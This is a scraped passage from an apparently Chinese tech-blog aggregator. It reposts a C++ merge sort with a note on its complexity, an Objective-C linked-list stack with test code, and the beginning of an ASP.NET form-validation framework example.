    <span class="keyword">while</span> (i &amp;<span class="keyword">lt</span>;= <span class="keyword">m</span>) {
        tmp[k++] = a[i++];
    }
    <span class="keyword">while</span> (j &amp;<span class="keyword">lt</span>;= r) {
        tmp[k++] = a[j++];
    }
    <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &amp;<span class="keyword">lt</span>;= r; ++i)
        a[i] = tmp[i];
}
void Merge_sort (<span class="keyword">int</span> l, <span class="keyword">int</span> r) {
    <span class="keyword">if</span> (l &amp;<span class="keyword">lt</span>; r) {
        <span class="keyword">int</span> <span class="keyword">m</span> = (l + r) &amp;<span class="keyword">gt</span>;&amp;<span class="keyword">gt</span>; <span class="number">1</span>;
        Merge_sort (l, <span class="keyword">m</span>);
        Merge_sort (<span class="keyword">m</span> + <span class="number">1</span>, r);
        Merge (l, <span class="keyword">m</span>, r);
    }
}
<span class="keyword">int</span> main() {
    std::ios::sync_with_stdio(false);
    <span class="keyword">int</span> i, j, t, k, u, c, v, p, numCase = <span class="number">0</span>;
    <span class="keyword">while</span> (cin &amp;<span class="keyword">gt</span>;&amp;<span class="keyword">gt</span>; n) {
        <span class="keyword">for</span> (i = <span class="number">0</span>; i &amp;<span class="keyword">lt</span>; n; ++i) {
            cin &amp;<span class="keyword">gt</span>;&amp;<span class="keyword">gt</span>; a[i];
        }
        Merge_sort(<span class="number">0</span>, n - <span class="number">1</span>);
        <span class="keyword">for</span> (i = <span class="number">0</span>; i &amp;<span class="keyword">lt</span>; n; ++i) {
            cout &amp;<span class="keyword">lt</span>;&amp;<span class="keyword">lt</span>; a[i] &amp;<span class="keyword">lt</span>;&amp;<span class="keyword">lt</span>; endl;
        }
    }
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7684;&#x6548;&#x7387;&#x662F;&#x6BD4;&#x8F83;&#x9AD8;&#x7684;&#xFF0C;&#x8BBE;&#x6570;&#x5217;&#x957F;&#x4E3A;N&#xFF0C;&#x5C06;&#x6570;&#x5217;&#x5206;&#x5F00;&#x6210;&#x5C0F;&#x6570;&#x5217;&#x4E00;&#x5171;&#x8981;logN&#x6B65;&#xFF0C;</p>
<p>&#x6BCF;&#x6B65;&#x90FD;&#x662F;&#x4E00;&#x4E2A;&#x5408;&#x5E76;&#x6709;&#x5E8F;&#x6570;&#x5217;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x53EF;&#x4EE5;&#x8BB0;&#x4E3A;O(N)&#xFF0C;&#x6545;&#x4E00;&#x5171;&#x4E3A;O(N*logN)&#x3002;</p>
<p>&#x56E0;&#x4E3A;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x6BCF;&#x6B21;&#x90FD;&#x662F;&#x5728;&#x76F8;&#x90BB;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;</p>
<p>&#x6240;&#x4EE5;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x5728;O(N*logN)&#x7684;&#x51E0;&#x79CD;&#x6392;&#x5E8F;&#x65B9;&#x6CD5;&#xFF08;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#xFF0C;&#x5F52;&#x5E76;&#x6392;&#x5E8F;&#xFF0C;&#x5E0C;&#x5C14;&#x6392;&#x5E8F;&#xFF0C;&#x5806;&#x6392;&#x5E8F;&#xFF09;</p>
<p>&#x4E5F;&#x662F;&#x6548;&#x7387;&#x6BD4;&#x8F83;&#x9AD8;&#x7684;&#x3002;</p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/3UfaIzA">&#x5224;&#x65AD;&#x6B27;&#x62C9;&#x56DE;&#x8DEF;</a></li>
<li>2.<a href="/articles/BnYNRjI">PAT Gas Station</a></li>
<li>3.<a href="/articles/yY7RF3">USACO 2.2 Party Lamps &#x6D3E;&#x5BF9;&#x706F; (lamps)</a></li>
<li>4.<a href="/articles/BRrEJv">&#x201C;&#x5F3A;&#x7F51;&#x676F;&#x201D;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6311;&#x6218;&#x8D5B;WriteUp</a></li>
<li>5.<a href="/articles/vuuUFjY">&#x51E0;&#x79CD;&#x9501;&#x7B97;&#x6CD5;&#x7684;&#x5B9E;&#x73B0;</a></li>
<li><p>6.<a href="/articles/NrMJJz">CUDA —— Dynamic Parallelism</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/qqAFRzM">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;qqAFRzM&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/归并排序/">归并排序</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/cbada41/" title="算法-链表实现栈 -" itemprop="url">算法-链表实现栈 -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-07T02:16:31.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="&#x7B97;&#x6CD5;-&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x6808;">&#x7B97;&#x6CD5;-&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x6808;</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 14:11:00  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/xiaofeixiang/p/4558408.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/xiaofeixiang/p/4558408.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11120054">&#x94FE;&#x8868;</a><a href="/topics/11080009">iOS&#x5F00;&#x53D1;</a></p>
<p>&#x94FE;&#x8868;&#x662F;&#x4E00;&#x79CD;&#x9012;&#x5F52;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x5B83;&#x6216;&#x8005;&#x4E3A;&#x7A7A;(null)&#xFF0C;&#x6216;&#x8005;&#x53EA;&#x60F3;&#x4E00;&#x4E2A;&#x8282;&#x70B9;(node)&#x7684;&#x5F15;&#x7528;&#xFF0C;&#x6539;&#x8282;&#x70B9;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x548C;&#x6267;&#x884C;&#x53E6;&#x5916;&#x4E00;&#x6761;&#x94FE;&#x8868;&#x7684;&#x5F15;&#x7528;&#xFF0C;&#x8282;&#x70B9;&#x53EF;&#x80FD;&#x662F;&#x5305;&#x542B;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x6570;&#x636E;&#x7684;&#x62BD;&#x8C61;&#x5C38;&#x4F53;&#xFF0C;&#x5305;&#x542B;&#x7684;&#x53EA;&#x60F3;&#x8282;&#x70B9;&#x7684;&#x5E94;&#x7528;&#x663E;&#x793A;&#x4E86;&#x5B83;&#x5728;&#x94FE;&#x8868;&#x4E4B;&#x4E2D;&#x7684;&#x4F5C;&#x7528;&#x3002;&#x76F8;&#x6BD4;&#x6570;&#x7EC4;&#x6765;&#x8BF4;&#x6709;&#x66F4;&#x591A;&#x7684;&#x7075;&#x6D3B;&#x6027;&#xFF0C; &#x672C;&#x6587;&#x5C31;&#x7B80;&#x5355;&#x7684;&#x7528;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x4E00;&#x4E0B;&#x6808;&#xFF0C;&#x6808;&#x7684;&#x6700;&#x5927;&#x7684;&#x7279;&#x70B9;&#x5C31;&#x662F;&#x540E;&#x8FDB;&#x5148;&#x51FA;&#xFF0C;&#x961F;&#x5217;&#x662F;&#x5148;&#x8FDB;&#x5148;&#x51FA;&#xFF0C;&#x4E24;&#x8005;&#x4E0D;&#x592A;&#x4E00;&#x6837;&#xFF0C;&#x672C;&#x6587;&#x5C06;&#x7B80;&#x5355;&#x7684;&#x7528;OC&#x5B9E;&#x73B0;&#x6808;&#x3002;</p>
<p>Node&#x5B9A;&#x4E49;:</p>
<pre><code><span class="variable">@interface</span> <span class="attribute">Node </span>: NSObject

<span class="variable">@property</span>  (strong,nonatomic)  NSString  *value;

<span class="variable">@property</span>  (strong,nonatomic)  Node  *next;

<span class="variable">@end</span>
</code></pre><p>Stack&#x5934;&#x6587;&#x4EF6;&#x5B9A;&#x4E49;:</p>
<pre><code><span class="class"><span class="keyword">@interface</span> <span class="title">Stack</span> : <span class="title">NSObject</span></span>
<span class="comment">//&amp;#x6808;&amp;#x9876;&amp;#x7684;&amp;#x5143;&amp;#x7D20;</span>
<span class="keyword">@property</span>  (<span class="keyword">strong</span>,<span class="keyword">nonatomic</span>) Node  *first;

<span class="keyword">@property</span>  (<span class="keyword">assign</span>,<span class="keyword">nonatomic</span>) <span class="built_in">NSInteger</span>  count;

-(<span class="built_in">BOOL</span>)isEmpty;

-(<span class="built_in">NSInteger</span>)size;

-(<span class="keyword">void</span>)push:(<span class="built_in">NSString</span> *)value;

-(<span class="built_in">NSString</span> *)pop;

-(<span class="keyword">void</span>)remove:(<span class="built_in">NSString</span> *)value;

<span class="keyword">@end</span>
</code></pre><p>&#x5176;&#x4E2D;&#x6709;&#x4E09;&#x4E2A;&#x4E3B;&#x8981;&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;&#xFF0C;&#x5165;&#x6808;(push),&#x51FA;&#x6808;(pop)&#xFF0C;&#x5220;&#x9664;(remove),&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x672C;&#x6587;&#x4E2D;&#x7684;&#x5220;&#x9664;&#x662F;&#x5355;&#x5411;&#x94FE;&#x8868;&#x7684;&#x5220;&#x9664;&#xFF0C;&#x5982;&#x679C;&#x5220;&#x9664;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#xFF0C;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x94FE;&#x8868;&#x7684;&#x957F;&#x5EA6;&#x6709;&#x5173;&#x7CFB;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x53CC;&#x5411;&#x94FE;&#x8868;&#xFF0C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x53EF;&#x4EE5;&#x7814;&#x7A76;&#x4E00;&#x4E0B;&#x3002;</p>
<p>Stack.m&#x7684;&#x5B9E;&#x73B0;&#x4EE3;&#x7801;:</p>
<pre><code><span class="variable">@implementation</span> <span class="constant">Stack</span>
-(<span class="constant">BOOL</span>)isEmpty{
    <span class="keyword">return</span> <span class="keyword">self</span>.count==<span class="number">0</span>;
}
-(<span class="constant">NSInteger</span>)size{
    <span class="keyword">return</span> <span class="keyword">self</span>.count;
}
-(void)<span class="symbol">push:</span>(<span class="constant">NSString</span> *)value{
    <span class="constant">Node</span>  *oldFirst=<span class="keyword">self</span>.first;
    <span class="keyword">self</span>.first=[[<span class="constant">Node</span> alloc]init];
    <span class="keyword">self</span>.first.value=value;
    <span class="keyword">self</span>.first.<span class="keyword">next</span>=oldFirst;
    <span class="keyword">self</span>.count=<span class="keyword">self</span>.count+<span class="number">1</span>;
}
-(<span class="constant">NSString</span> *)pop{
    <span class="keyword">if</span> (!<span class="keyword">self</span>.first) {
        <span class="keyword">return</span> [<span class="constant">NSString</span> <span class="symbol">stringWithFormat:</span>@&amp;quot;-<span class="number">1</span>&amp;quot;];
    }
    <span class="constant">NSString</span> *value=<span class="keyword">self</span>.first.value;
    <span class="keyword">self</span>.first=<span class="keyword">self</span>.first.<span class="keyword">next</span>;
    <span class="keyword">self</span>.count=<span class="keyword">self</span>.count-<span class="number">1</span>;
    <span class="keyword">return</span> value;
}
-(void)<span class="symbol">remove:</span>(<span class="constant">NSString</span> *)value{
    <span class="keyword">if</span> ([<span class="keyword">self</span>.first.value <span class="symbol">isEqualToString:</span>value]) {
        <span class="constant">Node</span> *node=<span class="keyword">self</span>.first;
        <span class="constant">Node</span> *nextNode=node.<span class="keyword">next</span>;
        node.value=nextNode.value;
        node.<span class="keyword">next</span>=nextNode.<span class="keyword">next</span>;
        <span class="keyword">self</span>.count=<span class="keyword">self</span>.count-<span class="number">1</span>;
    }<span class="keyword">else</span>{
        <span class="constant">Node</span> *node=<span class="keyword">self</span>.first;
        <span class="keyword">while</span> (node.<span class="keyword">next</span>) {
            <span class="keyword">if</span> ([node.<span class="keyword">next</span>.value <span class="symbol">isEqualToString:</span>value]){
                <span class="keyword">if</span> (node.<span class="keyword">next</span>.<span class="keyword">next</span>) {
                    <span class="constant">Node</span> *tempNode=node.<span class="keyword">next</span>.<span class="keyword">next</span>;
                    node.<span class="keyword">next</span>=tempNode;
                }<span class="keyword">else</span>{
                    node.<span class="keyword">next</span>=<span class="constant">NULL</span>;
                }
                <span class="keyword">self</span>.count=<span class="keyword">self</span>.count-<span class="number">1</span>;
                <span class="keyword">break</span>;
            }<span class="keyword">else</span>{
                node=node.<span class="keyword">next</span>;
            }
        }
    }
}
<span class="variable">@end</span>
</code></pre><p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;:</p>
<pre><code>Stack  *stack=[[Stack alloc]init];
        Node *first=[[Node alloc]init];
        first.value=@&amp;quot;iOS&amp;<span class="array">#x</span>6280;&amp;<span class="array">#x</span>672F;&amp;<span class="array">#x</span>4EA4;&amp;<span class="array">#x</span>6D41;&amp;<span class="array">#x</span>7FA4;:<span class="number">228407086</span>&amp;quot;;
        first.next=NULL;
        stack.first=first;
        [stack push:@&amp;quot;FlyElephant&amp;quot;];
        [stack push:@&amp;quot;&amp;<span class="array">#x</span>535A;&amp;<span class="array">#x</span>5BA2;&amp;<span class="array">#x</span>56ED;&amp;quot;];
        [stack push:@&amp;quot;keso&amp;quot;];
        [stack remove:@&amp;quot;FlyElephant&amp;quot;];
        NSLog(@&amp;quot;&amp;<span class="array">#x</span>51FA;&amp;<span class="array">#x</span>6808;:%@&amp;quot;,stack.pop);
        NSLog(@&amp;quot;&amp;<span class="array">#x</span>51FA;&amp;<span class="array">#x</span>6808;:%@&amp;quot;,stack.pop);
        NSLog(@&amp;quot;&amp;<span class="array">#x</span>51FA;&amp;<span class="array">#x</span>6808;:%@&amp;quot;,stack.pop);
        NSLog(@&amp;quot;&amp;<span class="array">#x</span>51FA;&amp;<span class="array">#x</span>6808;:%@&amp;quot;,stack.pop);
</code></pre><p>&#x6548;&#x679C;&#x5982;&#x4E0B;:</p>
<p> <img src="http://taojinke.github.io/img/20150607/cbab331.png" alt=""></p>
<p>&#x8D5E;&#x4E00;&#x4E2A; &#x6536; &#x85CF; </p>
<p> &#x63A8;&#x8350;&#x6587;&#x7AE0;</p>
<ul>
<li>1.<a href="/articles/QJ7Fbi">&#x4F7F;&#x7528;UITableView&#x7684;&#x5206;&#x7EC4;&#x6837;&#x5F0F;</a></li>
<li>2.<a href="/articles/Nn6rimu">QQ&#x804A;&#x5929;&#x754C;&#x9762;&#x7684;&#x5E03;&#x5C40;&#x548C;&#x8BBE;&#x8BA1;(IOS&#x7BC7;)-&#x7B2C;&#x4E00;&#x5B63;</a></li>
<li>3.<a href="/articles/UzqiUr">[oc&#x5B66;&#x4E60;&#x65E5;&#x8BB0;]kvc,kvo&#x548C;&#x901A;&#x77E5;</a></li>
<li>4.<a href="/articles/IZFFfm">[&#x539F;]Objective-C &#x5947;&#x5DE7;&#x6DEB;&#x6280;—&#x7528;&#x6C49;&#x8BED;&#x5199;Objective-C</a></li>
<li>5.<a href="/articles/umEzyyA">&#x4F7F;&#x7528;UITableView&#x5C55;&#x793A;&#x6570;&#x636E;</a></li>
<li><p>6.<a href="/articles/BRZjErb">IOS&#x5F00;&#x53D1;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;042-UITableView&#x603B;&#x7ED3;2</a></p>
<p>&#x76F8;&#x5173;&#x5FAE;&#x535A; <a href="/articles/weibo_list/NF7bUv">()</a></p>
</li>
</ul>
<h5 id="&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;">&#x6211;&#x6765;&#x8BC4;&#x51E0;&#x53E5;</h5><p>&#x9519;&#x8BEF; </p>
<p> &#x767B;&#x5F55;&#x540E;&#x8BC4;&#x8BBA; &#x5DF2;&#x53D1;&#x8868;&#x8BC4;&#x8BBA;&#x6570;( ) </p>
<p>&#x6CA1;&#x6709;&#x66F4;&#x591A;&#x8BC4;&#x8BBA;&#x4E86;^^ </p>
<p>&#x66F4;&#x591A;&#x8BC4;&#x8BBA;</p>
<p>&#x8BC4;&#x8BBA;&#x52A0;&#x8F7D;&#x5931;&#x8D25;&#xFF0C;<a href="javascript:reload_comments(&apos;NF7bUv&apos;,1,0,-1);" target="_blank" rel="external">&#x91CD;&#x65B0;&#x52A0;&#x8F7D;</a></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/transcribe/">transcribe</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/iOS开发/">iOS开发</a><a href="/tags/链表/">链表</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2015/06/07/cbd3c9b/" title="ValidationSuar表单验证框架-支持ASP.NET MVC ASP.NET WebFroM -" itemprop="url">ValidationSuar表单验证框架-支持ASP.NET MVC ASP.NET WebFroM -</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="edwin" target="_blank" itemprop="author">edwin</a>
		
  <p class="article-time">
    <time datetime="2015-06-07T02:16:31.000Z" itemprop="datePublished"> 发表于 2015-06-07</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="ValidationSuar&#x8868;&#x5355;&#x9A8C;&#x8BC1;&#x6846;&#x67B6;-&#x652F;&#x6301;ASP-NET_MVC_ASP-NET_WebFroM">ValidationSuar&#x8868;&#x5355;&#x9A8C;&#x8BC1;&#x6846;&#x67B6;-&#x652F;&#x6301;ASP.NET MVC ASP.NET WebFroM</h1><p> &#x65F6;&#x95F4;&#xA0;2015-06-07 11:54:31  <a href="/sites/Fn2umm">&#x535A;&#x5BA2;&#x56ED;-&#x539F;&#x521B;&#x7CBE;&#x534E;&#x533A;</a></p>
<p><em>&#x539F;&#x6587;</em>&#xA0; <a href="http://www.cnblogs.com/sunkaixuan/p/4558205.html?utm_source=tuicool" target="_blank" rel="external">http://www.cnblogs.com/sunkaixuan/p/4558205.html</a></p>
<p> &#x4E3B;&#x9898; <a href="/topics/11060004">JavaScript</a><a href="/topics/11060000">Html</a></p>
<h4 id="&#x4ECB;&#x5F3A;&#x4E0B;ValidationSuar&#x8868;&#x5355;&#x9A8C;&#x8BC1;&#x6846;&#x67B6;&#x7684;&#x597D;&#x7528;:">&#x4ECB;&#x5F3A;&#x4E0B;ValidationSuar&#x8868;&#x5355;&#x9A8C;&#x8BC1;&#x6846;&#x67B6;&#x7684;&#x597D;&#x7528;:</h4><p>1&#x3001;&#x652F;&#x6301;javascript&#x7AEF;&#x548C;&#x540E;&#x7AEF;&#x7684;&#x53CC;&#x91CD;&#x9A8C;&#x8BC1; (&#x524D;&#x7AEF;&#x76EE;&#x524D;&#x4F9D;&#x8D56;&#x4E8E;jquery.validate.js&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5DF2;&#x6269;&#x5C55;)</p>
<p>2&#x3001;&#x4EE3;&#x7801;&#x7B80;&#x6D01;</p>
<p>3&#x3001;&#x8C03;&#x7528;&#x65B9;&#x4FBF;</p>
<p>4&#x3001;&#x529F;&#x80FD;&#x9F50;&#x5168;</p>
<h4 id="&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;">&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;</h4><p>&#x65B0;&#x5EFA;&#x521D;&#x59CB;&#x5316;&#x7C7B;&#xFF0C;&#x5C06;&#x6240;&#x6709;&#x9700;&#x8981;&#x9A8C;&#x8BC1;&#x7684;&#x5728;&#x8BE5;&#x7C7B;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x8BED;&#x6CD5;&#x76F8;&#x5F53;&#x7B80;&#x6D01;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x7EDF;&#x4E00;&#x7BA1;&#x7406;&#xFF0C;&#x5199;&#x5B8C;&#x8FD9;&#x4E2A;&#x7C7B;&#x4F60;&#x7684;&#x9A8C;&#x8BC1;&#x5C31;&#x5B8C;&#x6210;&#x4E86;70%</p>
<h4 id="&#x51FD;&#x6570;&#x4ECB;&#x7ECD;&#xFF1A;">&#x51FD;&#x6570;&#x4ECB;&#x7ECD;&#xFF1A;</h4><p>Add &#x9ED8;&#x8BA4;&#x7C7B;&#x578B;&#xFF08;&#x90AE;&#x4EF6;&#x3001;&#x624B;&#x673A;&#x3001;qq&#x7B49;&#xFF09;</p>
<p>AddRegex &#x6B63;&#x5219;&#x9A8C;&#x8BC1; &#x5728;Add&#x65E0;&#x6CD5;&#x6EE1;&#x8DB3;&#x60C5;&#x90E8;&#x4E0B;&#x4F7F;&#x7528;</p>
<p>addFunc &#x4F7F;&#x7528;js&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1; (&#x6CE8;&#x610F;&#xFF1A;js&#x51FD;&#x6570;&#x9A8C;&#x8BC1;&#x540E;&#x53F0;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x9A8C;&#x8BC1;&#xFF0C;&#x6240;&#x4EE5;&#x80FD;&#x7528;&#x4E0A;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#x9A8C;&#x8BC1;&#x7684;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x4E0A;&#x9762;&#x7684;&#xFF0C;&#x8FD9;&#x5224;&#x6BB5;&#x5927;&#x591A;&#x6570;&#x7528;&#x5728; &#x9A8C;&#x8BC1; &#x7528;&#x6237;&#x540D;&#x662F;&#x5426;&#x5B58;,&#x4E24;&#x6B21;&#x5BC6;&#x7801;&#x4E0D;&#x81F3; &#x65E0;&#x6CD5;&#x7528;&#x6B63;&#x5219;&#x7684;&#x60C5;&#x51B5;&#x4E0B;)</p>
<pre><code>using <span class="class">System</span>;
using <span class="class">System</span>.<span class="class">Collections</span>.<span class="class">Generic</span>;
using <span class="class">System</span>.<span class="class">Linq</span>;
using <span class="class">System</span>.<span class="class">Web</span>;
using <span class="class">SyntacticSugar</span>;
namespace <span class="class">ValidationSuarMVC</span>.<span class="class">Models</span>
{
     public class <span class="class">Validates</span>
     {
          public static void <span class="class">Init</span>()
          {
                //login
                <span class="class">ValidationSugar</span>.<span class="class">Init</span>(<span class="class">PageKeys</span>.<span class="class">LOGIN_KEY</span>,
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;userName&amp;quot;, <span class="keyword">true</span>/*&amp;<span class="symbol">#x662F</span>;&amp;<span class="symbol">#x5426</span>;&amp;<span class="symbol">#x5FC5</span>;&amp;<span class="symbol">#x586B</span>;*/, &amp;quot;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x6237</span>;&amp;<span class="symbol">#x540D</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;[a-z,<span class="class">A</span>-<span class="class">Z</span>].*&amp;quot;, &amp;quot;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x6237</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x5FC5</span>;&amp;<span class="symbol">#x987B</span>;&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x6BCD</span>;&amp;<span class="symbol">#x5F00</span>;&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#xFFFD</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;.{<span class="number">5</span>,<span class="number">15</span>}&amp;quot;, &amp;quot;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">5</span>-<span class="number">15</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x7B26</span>;&amp;quot;).<span class="class">AddFunc</span>(&amp;quot;checkUserName&amp;quot;, &amp;quot;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x6237</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x5728</span>;&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>; admin1 &amp;<span class="symbol">#x8BD5</span>;&amp;<span class="symbol">#x8BD5</span>;&amp;quot;).<span class="class">ToOptionItem</span>(),
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;password&amp;quot;, <span class="keyword">true</span>, &amp;quot;&amp;<span class="symbol">#x5BC6</span>;&amp;<span class="symbol">#x7801</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;[<span class="number">0</span>-<span class="number">9</span>].*&amp;quot;, &amp;quot;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x6237</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x5FC5</span>;&amp;<span class="symbol">#x987B</span>;&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x5F00</span>;&amp;<span class="symbol">#x5934</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;.{<span class="number">5</span>,<span class="number">15</span>}&amp;quot;, &amp;quot;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">5</span>-<span class="number">15</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x7B26</span>;&amp;quot;).<span class="class">ToOptionItem</span>()
                    );
                //register
                <span class="class">ValidationSugar</span>.<span class="class">Init</span>(<span class="class">PageKeys</span>.<span class="class">REGISTER_KEY</span>,
                    <span class="class">ValidationSugar</span>.<span class="class">CreateOptionItem</span>().<span class="class">Set</span>(&amp;quot;userName&amp;quot;, <span class="keyword">true</span>, &amp;quot;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x6237</span>;&amp;<span class="symbol">#x540D</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;[a-z,<span class="class">A</span>-<span class="class">Z</span>].*&amp;quot;, &amp;quot;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x6237</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x5FC5</span>;&amp;<span class="symbol">#x987B</span>;&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x6BCD</span>;&amp;<span class="symbol">#x5F00</span>;&amp;<span class="symbol">#x5934</span>;&amp;quot;).<span class="class">AddRegex</span>(&amp;quot;.{<span class="number">5</span>,<span class="number">15</span>}&amp;quot;, &amp;quot;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">5</span>-<span class="number">15</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x7B26</span>;&amp;quot;).<span class="class">AddFunc</span>(&amp;quot;checkUserName&amp;quot;, &amp;quot;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x6237</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x5DF2</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x5728</span>;!&amp;quot;).<span class="class">ToOptionItem</span>(),
